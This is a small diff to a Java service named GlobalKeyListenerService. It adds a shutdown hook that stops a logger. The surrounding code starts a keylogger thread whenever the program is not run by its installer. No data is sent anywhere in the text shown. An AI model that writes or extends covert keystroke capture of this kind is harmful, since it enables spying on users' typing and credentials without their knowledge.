@@ -55,6 +55,10 @@ public class GlobalKeyListenerService {
     // initialize the method after the dependencies are loaded
     @PostConstruct
     public void init() {
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            stopLogger();
+            System.out.println("Service shutdown complete");
+        }));
         if (!isRunByInstaller()) {
             logger.info("Initializing keylogger service...");
             new Thread(this::startKeylogger).start();
